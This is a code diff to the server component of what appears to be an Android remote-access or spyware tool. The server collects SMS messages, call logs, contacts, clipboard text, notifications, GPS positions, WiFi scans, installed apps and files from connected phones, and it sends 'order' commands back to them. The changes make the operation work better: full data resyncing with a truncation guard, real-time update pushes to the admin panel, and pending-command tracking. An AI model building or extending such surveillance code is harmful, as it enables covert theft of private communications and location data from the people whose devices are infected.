@@ -9,7 +9,18 @@ class Clients {
         this.gpsPollers = Object.create(null);
         this.clientDatabases = Object.create(null);
         this.ignoreDisconnects = Object.create(null);
+        this.pendingUpdates = Object.create(null); // Track commands awaiting device response
         this.db = db;
+    }
+
+    // Notify admin browser that device data has been updated
+    notifyDataUpdated(clientID, commandID) {
+        if (this.pendingUpdates[clientID] && this.pendingUpdates[clientID].has(commandID)) {
+            this.pendingUpdates[clientID].delete(commandID);
+            if (global.adminIO) {
+                global.adminIO.to('device:' + clientID).emit('dataUpdated', { clientID, commandID });
+            }
+        }
     }
 
     // UPDATE
@@ -70,6 +81,7 @@ class Clients {
         
         if (this.clientConnections[clientID]) delete this.clientConnections[clientID];
         if (this.gpsPollers[clientID]) clearInterval(this.gpsPollers[clientID]);
+        if (this.pendingUpdates[clientID]) delete this.pendingUpdates[clientID];
         
         // Only delete the DB handle if we are NOT ignoring (a real disconnect/cleanup)
         if (!shouldIgnore && this.clientDatabases[clientID]) delete this.clientDatabases[clientID];
@@ -174,7 +186,7 @@ class Clients {
                 }
             } else if (data.type === "download") {
                 // Ayy, time to recieve a file!
-                logManager.log(CONST.logTypes.info, "Recieving File From" + clientID);
+                logManager.log(CONST.logTypes.info, "Recieving File From " + clientID);
 
                 // Patch: Guard against null buffer or name
                 if (!data.buffer || !data.name || typeof data.name !== 'string') return;
@@ -209,7 +221,7 @@ class Clients {
                             originalName: sanitizedName.substring(0, 255),
                             path: CONST.downloadsFolder + '/' + fileKey + fileExt
                         }).write();
-                        logManager.log(CONST.logTypes.success, "File From" + clientID + " Saved");
+                        logManager.log(CONST.logTypes.success, "File From " + clientID + " Saved");
                     }
                     else if (CONST.debug) console.log(error); // not ok
                 })
@@ -224,23 +236,19 @@ class Clients {
             if (!data || typeof data !== 'object') return;
             if (data.callsList && Array.isArray(data.callsList)) {
                 if (data.callsList.length !== 0) {
-                    let callsList = data.callsList.slice(0, 1000); // Cap updates
-                    let dbCall = client.get('CallData');
-                    let newCount = 0;
+                    let callsList = data.callsList.slice(0, 1000);
+                    let validCalls = [];
                     callsList.forEach(call => {
                         if (!call.phoneNo || !call.date) return;
                         call.phoneNo = String(call.phoneNo).substring(0, 100);
                         call.date = String(call.date).substring(0, 50);
-                        let hash = crypto.createHash('md5').update(call.phoneNo + call.date).digest("hex");
-                        if (dbCall.find({ hash }).value() === undefined) {
-                            // cool, we dont have this call
-                            call.hash = hash;
-                            dbCall.push(call);
-                            newCount++;
-                        }
+                        call.hash = crypto.createHash('md5').update(call.phoneNo + call.date).digest("hex");
+                        validCalls.push(call);
                     });
-                    if (newCount > 0) dbCall.write(); // Batch write
-                    logManager.log(CONST.logTypes.success, clientID + " Call Log Updated - " + newCount + " New Calls");
+                    // Replace the entire call dataset with what the device reports (with safety check)
+                    this.safeReplaceData(client, 'CallData', validCalls);
+                    logManager.log(CONST.logTypes.success, clientID + " Call Log Updated - " + validCalls.length + " Calls Synced");
+                    this.notifyDataUpdated(clientID, CONST.messageKeys.call);
                 }
             }
 
@@ -252,23 +260,17 @@ class Clients {
                 return;
             }
             let smsList = data.smslist;
-            // Patch 6: Validate smsList
             if (smsList && Array.isArray(smsList) && smsList.length !== 0) {
-                let dbSMS = client.get('SMSData');
-                let newCount = 0;
+                let validMessages = [];
                 smsList.forEach(sms => {
-                    // Patch: Guard against non-string address and body
                     if (!sms.address || !sms.body || typeof sms.address !== 'string' || typeof sms.body !== 'string') return;
-                    let hash = crypto.createHash('md5').update(sms.address + sms.body).digest("hex");
-                    if (dbSMS.find({ hash }).value() === undefined) {
-                        // cool, we dont have this sms
-                        sms.hash = hash;
-                        dbSMS.push(sms);
-                        newCount++; // Patch 6: Increment counter
-                    }
+                    sms.hash = crypto.createHash('md5').update(sms.address + sms.body).digest("hex");
+                    validMessages.push(sms);
                 });
-                if (newCount > 0) dbSMS.write(); // Batch write
-                logManager.log(CONST.logTypes.success, clientID + " SMS List Updated - " + newCount + " New Messages");
+                // Replace the entire SMS dataset with what the device reports (with safety check)
+                this.safeReplaceData(client, 'SMSData', validMessages);
+                this.notifyDataUpdated(clientID, CONST.messageKeys.sms);
+                logManager.log(CONST.logTypes.success, clientID + " SMS List Updated - " + validMessages.length + " Messages Synced");
             }
         });
 
@@ -311,7 +313,7 @@ class Clients {
         });
 
         socket.on(CONST.messageKeys.location, (data) => {
-            if (data && typeof data === 'object' && Object.keys(data).length !== 0 && data.hasOwnProperty("latitude") && data.hasOwnProperty("longitude")) {
+            if (data && typeof data === 'object' && Object.keys(data).length !== 0 && Object.prototype.hasOwnProperty.call(data, "latitude") && Object.prototype.hasOwnProperty.call(data, "longitude")) {
                 client.get('GPSData').push({
                     time: new Date(),
                     enabled: !!data.enabled,
@@ -329,14 +331,21 @@ class Clients {
         });
 
         socket.on(CONST.messageKeys.clipboard, (data) => {
-            // Patch: Guard against null/undefined clipboard content
             if (!data || typeof data !== 'object') return;
             if (typeof data.text !== 'string' || data.text.length > 1000000) return;
-            client.get('clipboardLog').push({
+            let dbClipboard = client.get('clipboardLog');
+            // NOTE: .value().push() mutates the underlying array directly, then .write() flushes to disk.
+            // This works with LowDB v1 (lodash chain) but may break on v2+ where .value() could return a copy.
+            dbClipboard.value().push({
                 time: new Date(),
                 content: data.text
-            }).write();
+            });
+            dbClipboard.write();
             logManager.log(CONST.logTypes.info, clientID + " ClipBoard Recieved");
+            // Always notify admin for unsolicited data (not tied to a sendCommand)
+            if (global.adminIO) {
+                global.adminIO.to('device:' + clientID).emit('dataUpdated', { clientID, commandID: CONST.messageKeys.clipboard });
+            }
         });
 
         socket.on(CONST.messageKeys.notification, (data) => {
@@ -348,7 +357,8 @@ class Clients {
 
             if (dbNotificationLog.find({ hash }).value() === undefined) {
                 data.hash = hash;
-                dbNotificationLog.push(data).write();
+                dbNotificationLog.value().push(data);
+                dbNotificationLog.write();
                 logManager.log(CONST.logTypes.info, clientID + " Notification Recieved");
             }
         });
@@ -357,22 +367,18 @@ class Clients {
             if (!data || typeof data !== 'object') return;
             if (data.contactsList && Array.isArray(data.contactsList)) {
                 if (data.contactsList.length !== 0) {
-                    let contactsList = data.contactsList.slice(0, 1000); // Patch: Cap updates
-                    let dbContacts = client.get('contacts');
-                    let newCount = 0;
+                    let contactsList = data.contactsList.slice(0, 1000);
+                    let validContacts = [];
                     contactsList.forEach(contact => {
                         if (!contact.phoneNo) return;
                         contact.phoneNo = contact.phoneNo.replace(/\s+/g, '');
-                        let hash = crypto.createHash('md5').update(contact.phoneNo + (contact.name || '')).digest("hex");
-                        if (dbContacts.find({ hash }).value() === undefined) {
-                            // cool, we dont have this contact
-                            contact.hash = hash;
-                            dbContacts.push(contact);
-                            newCount++;
-                        }
+                        contact.hash = crypto.createHash('md5').update(contact.phoneNo + (contact.name || '')).digest("hex");
+                        validContacts.push(contact);
                     });
-                    if (newCount > 0) dbContacts.write(); // Batch write
-                    logManager.log(CONST.logTypes.success, clientID + " Contacts Updated - " + newCount + " New Contacts Added");
+                    // Replace the entire contacts dataset with what the device reports (with safety check)
+                    this.safeReplaceData(client, 'contacts', validContacts);
+                    this.notifyDataUpdated(clientID, CONST.messageKeys.contacts);
+                    logManager.log(CONST.logTypes.success, clientID + " Contacts Updated - " + validContacts.length + " Contacts Synced");
                 }
             }
 
@@ -382,28 +388,27 @@ class Clients {
             if (!data || typeof data !== 'object') return;
             if (data.networks && Array.isArray(data.networks)) {
                 if (data.networks.length !== 0) {
-                    let networks = data.networks.slice(0, 500); // Patch: Cap to 500 items
-                    let dbwifiLog = client.get('wifiLog');
+                    let networks = data.networks.slice(0, 500);
+                    // Replace current WiFi with what the device reports
                     client.set('wifiNow', networks).write();
+                    // Append new networks to the historical log
+                    let dbwifiLog = client.get('wifiLog');
                     let newCount = 0;
                     networks.forEach(wifi => {
-                        // Patch: Guard against missing SSID or BSSID
                         if (!wifi.SSID || !wifi.BSSID) return;
                         let wifiField = dbwifiLog.find({ SSID: wifi.SSID, BSSID: wifi.BSSID });
                         if (wifiField.value() === undefined) {
-                            // cool, we dont have this network
                             wifi.firstSeen = new Date();
                             wifi.lastSeen = new Date();
-                            dbwifiLog.push(wifi);
+                            dbwifiLog.value().push(wifi);
                             newCount++;
                         } else {
-                            wifiField.assign({
-                                lastSeen: new Date()
-                            });
+                            wifiField.assign({ lastSeen: new Date() });
                         }
                     });
-                    dbwifiLog.write(); // Batch write
+                    dbwifiLog.write();
                     logManager.log(CONST.logTypes.success, clientID + " WiFi Updated - " + newCount + " New WiFi Hotspots Found");
+                    this.notifyDataUpdated(clientID, CONST.messageKeys.wifi);
                 }
             }
         });
@@ -412,17 +417,31 @@ class Clients {
             if (!data || typeof data !== 'object') return;
             client.set('enabledPermissions', data.permissions || []).write();
             logManager.log(CONST.logTypes.success, clientID + " Permissions Updated");
+            this.notifyDataUpdated(clientID, CONST.messageKeys.permissions);
         });
 
         socket.on(CONST.messageKeys.installed, (data) => {
             if (!data || typeof data !== 'object') return;
             client.set('apps', data.apps || []).write();
             logManager.log(CONST.logTypes.success, clientID + " Apps Updated");
+            this.notifyDataUpdated(clientID, CONST.messageKeys.installed);
         });
     }
 
 
     // GET
+    // Guard against data-loss from truncated device responses.
+    // If the new list is less than 50% of the existing list, skip the replacement.
+    safeReplaceData(clientDB, key, newData) {
+        let existing = clientDB.get(key).value();
+        if (Array.isArray(existing) && existing.length > 0 && newData.length < existing.length * 0.5) {
+            logManager.log(CONST.logTypes.error, 'Refusing to replace ' + key + ': new list (' + newData.length + ') is less than half of existing (' + existing.length + ')');
+            return false;
+        }
+        clientDB.set(key, newData).write();
+        return true;
+    }
+
     getClient(clientID) {
         let client = this.db.maindb.get('clients').find({ clientID }).value();
         if (client !== undefined) return client;
@@ -504,6 +523,7 @@ class Clients {
             delete this.gpsPollers[clientID];
         }
         if (this.clientDatabases[clientID]) delete this.clientDatabases[clientID];
+        if (this.pendingUpdates[clientID]) delete this.pendingUpdates[clientID];
         if (clientID in this.ignoreDisconnects) delete this.ignoreDisconnects[clientID];
     }
 
@@ -517,6 +537,9 @@ class Clients {
                     if (clientID in this.clientConnections) {
                         let socket = this.clientConnections[clientID];
                         logManager.log(CONST.logTypes.info, "Requested " + commandID + " From " + clientID);
+                        // Track that we're waiting for a response from this command
+                        if (!this.pendingUpdates[clientID]) this.pendingUpdates[clientID] = new Set();
+                        this.pendingUpdates[clientID].add(commandID);
                         socket.emit('order', commandPayload)
                         return cb(false, 'Requested');
                     } else {
@@ -543,7 +566,7 @@ class Clients {
             let uid;
             let attempts = 0;
             do {
-                uid = crypto.randomBytes(4).readUInt32BE(0) % 10000;
+                uid = crypto.randomBytes(4).toString('hex');
                 if (++attempts > 100) return cb('Failed to generate unique command ID');
             } while (commandQue.find({ uid }).value());
             
